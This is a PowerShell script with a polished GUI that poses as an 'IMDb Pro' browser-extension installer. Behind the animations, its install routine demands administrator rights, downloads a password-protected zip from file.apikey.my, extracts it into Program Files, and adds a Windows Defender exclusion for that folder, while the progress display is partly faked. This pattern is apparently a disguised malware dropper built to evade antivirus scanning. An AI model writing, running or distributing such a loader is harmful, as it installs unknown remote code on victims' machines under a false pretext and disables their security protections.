# IMDb Pro Installer - Compact Modern UI with Animations
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create main form with compact design
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(700, 600)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 20)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Compact Header Panel
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(700, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($headerPanel)

# Compact Title
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "🎬 IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite v2.1.0"
$subtitleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$subtitleLabel.Location = New-Object System.Drawing.Point(160, 32)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel - More Compact
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
$contentPanel.Size = New-Object System.Drawing.Size(700, 450)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 25)
$mainForm.Controls.Add($contentPanel)

# Compact Features Section
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "✨ Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(25, 20)
$contentPanel.Controls.Add($featuresTitle)

# Compact Features Grid (2x3 layout)
$features = @(
    @{
        Title = "Real-time Ratings"
        Description = "Instant ratings access"
        Location = New-Object System.Drawing.Point(25, 60)
        Icon = "⭐"
    },
    @{
        Title = "Complete Movie Info" 
        Description = "Cast, crew & details"
        Location = New-Object System.Drawing.Point(255, 60)
        Icon = "🎬"
    },
    @{
        Title = "HD Trailers"
        Description = "Watch in browser"
        Location = New-Object System.Drawing.Point(485, 60)
        Icon = "📹"
    },
    @{
        Title = "Browser Integration"
        Description = "Seamless experience"
        Location = New-Object System.Drawing.Point(25, 180)
        Icon = "🌐"
    },
    @{
        Title = "Auto Updates"
        Description = "Always up-to-date"
        Location = New-Object System.Drawing.Point(255, 180)
        Icon = "🔄"
    },
    @{
        Title = "Secure & Private"
        Description = "Data protected"
        Location = New-Object System.Drawing.Point(485, 180)
        Icon = "🔒"
    }
)

$featurePanels = @()
foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(190, 90)
    $featurePanel.Location = $feature.Location
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    
    # Add hover effects
    $featurePanel.Add_MouseEnter({
        $this.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
        $this.Cursor = [System.Windows.Forms.Cursors]::Hand
    })
    $featurePanel.Add_MouseLeave({
        $this.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
    })
    
    $contentPanel.Controls.Add($featurePanel)
    
    # Modern Icon
    $iconLabel = New-Object System.Windows.Forms.Label
    $iconLabel.Text = $feature.Icon
    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 16, [System.Drawing.FontStyle]::Bold)
    $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
    $iconLabel.AutoSize = $true
    $iconLabel.Location = New-Object System.Drawing.Point(15, 15)
    $featurePanel.Controls.Add($iconLabel)
    
    # Feature Title
    $title = New-Object System.Windows.Forms.Label
    $title.Text = $feature.Title
    $title.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
    $title.ForeColor = [System.Drawing.Color]::White
    $title.AutoSize = $true
    $title.Location = New-Object System.Drawing.Point(50, 15)
    $featurePanel.Controls.Add($title)
    
    # Feature Description
    $desc = New-Object System.Windows.Forms.Label
    $desc.Text = $feature.Description
    $desc.Font = New-Object System.Drawing.Font("Segoe UI", 8)
    $desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    $desc.AutoSize = $true
    $desc.Location = New-Object System.Drawing.Point(15, 55)
    $featurePanel.Controls.Add($desc)
    
    $featurePanels += $featurePanel
}

# Compact Progress Section
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "📊 Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(25, 290)
$contentPanel.Controls.Add($progressTitle)

# Compact Progress Container
$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(650, 80)
$progressContainer.Location = New-Object System.Drawing.Point(25, 330)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(35, 35, 40)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

# Status with Animation Support
$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 12)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(15, 15)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(45, 17)
$progressContainer.Controls.Add($statusLabel)

# Progress Bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(15, 45)
$progressBar.Size = New-Object System.Drawing.Size(550, 20)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 55)
$progressContainer.Controls.Add($progressBar)

# Percentage Label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(575, 43)
$progressContainer.Controls.Add($percentLabel)

# Compact Button Panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 530)
$buttonPanel.Size = New-Object System.Drawing.Size(700, 70)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(28, 28, 32)
$mainForm.Controls.Add($buttonPanel)

# Compact Install Button
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$installButton.Size = New-Object System.Drawing.Size(300, 40)
$installButton.Location = New-Object System.Drawing.Point(200, 15)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Enhanced Button hover effects with animation
$installButton.Add_MouseEnter({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
        $this.Size = New-Object System.Drawing.Size(310, 42)
        $this.Location = New-Object System.Drawing.Point(195, 14)
    }
})

$installButton.Add_MouseLeave({
    if ($this.Text -eq "🚀 START INSTALLATION") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Size = New-Object System.Drawing.Size(300, 40)
        $this.Location = New-Object System.Drawing.Point(200, 15)
    }
})

$buttonPanel.Controls.Add($installButton)

# Animation Functions
function Start-LoadingAnimation {
    param($DurationMs = 1000)
    
    $startTime = Get-Date
    $icons = @("⏳", "⌛", "⏳", "⌛")
    $colors = @(
        [System.Drawing.Color]::FromArgb(245, 197, 24),
        [System.Drawing.Color]::FromArgb(41, 182, 246),
        [System.Drawing.Color]::FromArgb(255, 152, 0),
        [System.Drawing.Color]::FromArgb(76, 175, 80)
    )
    
    while (((Get-Date) - $startTime).TotalMilliseconds -lt $DurationMs) {
        $index = [int]((((Get-Date) - $startTime).TotalMilliseconds / 250) % $icons.Length)
        $statusIcon.Text = $icons[$index]
        $statusIcon.ForeColor = $colors[$index]
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 50
    }
    
    $statusIcon.ForeColor = [System.Drawing.Color]::White
}

function Start-ProgressAnimation {
    param($From, $To, $DurationMs = 600)
    
    $startTime = Get-Date
    $current = $From
    
    while ($current -lt $To) {
        $elapsed = ((Get-Date) - $startTime).TotalMilliseconds
        $progress = [Math]::Min($elapsed / $DurationMs, 1.0)
        $current = $From + ($To - $From) * $progress
        
        $progressBar.Value = [int]$current
        $percentLabel.Text = "$([int]$current)%"
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 20
    }
    
    $progressBar.Value = $To
    $percentLabel.Text = "$To%"
}

function Start-CelebrationAnimation {
    $celebrateIcons = @("🎉", "🎊", "✨", "🌟", "🎈")
    for ($i = 0; $i -lt 10; $i++) {
        $iconIndex = $i % $celebrateIcons.Length
        $statusIcon.Text = $celebrateIcons[$iconIndex]
        $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256),
            (Get-Random -Minimum 200 -Maximum 256)
        )
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Milliseconds 150
    }
    $statusIcon.ForeColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
}

# Enhanced Update function with animations
function Update-Status {
    param(
        [string]$Message, 
        [int]$ProgressValue, 
        [string]$Icon = "📌",
        [switch]$Loading,
        [switch]$AnimateProgress
    )
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    
    if ($Loading) {
        Start-LoadingAnimation -DurationMs 800
    }
    
    if ($AnimateProgress -and $ProgressValue -ge 0) {
        Start-ProgressAnimation -From $progressBar.Value -To $ProgressValue -DurationMs 600
    } elseif ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
        $percentLabel.Text = "$ProgressValue%"
    }
    
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 400
}

# Enhanced Installation function with animations
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        # Phase 1: Preparation with animations
        Update-Status "Checking administrator privileges..." 10 "🔍" -Loading
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0 "❌"
            [System.Windows.Forms.MessageBox]::Show(
                "Please run this installer as Administrator.", 
                "Elevation Required", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Warning
            )
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        
        # Phase 2: Setup with progress animations
        Update-Status "Creating installation directory..." 20 "📁" -AnimateProgress
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading IMDb Pro package..." 40 "📥" -Loading
        # Simulate download progress
        for ($i = 41; $i -le 60; $i++) {
            Update-Status "Downloading package... $($i-40)%" $i "📥"
            Start-Sleep -Milliseconds 50
        }
        
        # Simulate actual download
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
        
        Update-Status "Verifying download..." 65 "✅" -AnimateProgress
        
        # Phase 3: Extraction with animations
        Update-Status "Extracting package contents..." 70 "📦" -Loading
        $extractionSuccess = $false
        
        # Try 7-Zip first
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        
        if (-not $extractionSuccess) {
            Update-Status "Using alternative extraction..." 75 "⚡" -Loading
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
            }
            catch {
                $shellApp = New-Object -ComObject Shell.Application
                $zipFolder = $shellApp.NameSpace($tempFile)
                $destFolder = $shellApp.NameSpace($installPath)
                $destFolder.CopyHere($zipFolder.Items(), 0x14)
            }
        }
        
        # Simulate extraction progress
        for ($i = 76; $i -le 85; $i++) {
            Update-Status "Extracting files... $($i-75)*10%" $i "📦"
            Start-Sleep -Milliseconds 100
        }
        
        # Phase 4: Finalization
        Update-Status "Securing installation..." 88 "🔒" -AnimateProgress
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
        Update-Status "Finalizing setup..." 95 "🛠️" -Loading
        
        # Add Windows Defender exclusion
        try {
            Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        } catch {
            # Continue if Windows Defender exclusion fails
        }
        
        # Success animation sequence
        for ($i = 96; $i -le 100; $i++) {
            Update-Status "Completing installation..." $i "🎯"
            Start-Sleep -Milliseconds 100
        }
        
        Update-Status "Installation completed successfully!" 100 "✅"
        
        # Celebration animation
        Start-CelebrationAnimation
        
        # Final UI updates
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $installButton.Enabled = $false
        
        [System.Windows.Forms.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n📍 Location: $installPath`n✨ All features activated`n🔒 Security configured`n`nPlease restart your browser to start using IMDb Pro.",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
    }
    catch {
        # Error animation
        for ($i = 0; $i -lt 3; $i++) {
            Update-Status "Installation failed!" 0 "💥"
            Start-Sleep -Milliseconds 200
            Update-Status "Installation failed!" 0 "❌"
            Start-Sleep -Milliseconds 200
        }
        
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`nPlease check your internet connection and try again.",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Install button click event
$installButton.Add_Click({
    $installButton.Enabled = $false
    $installButton.Text = "⏳ INSTALLING..."
    $installButton.BackColor = [System.Drawing.Color]::FromArgb(255, 152, 0)
    Start-Installation
})

# Show the form
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null
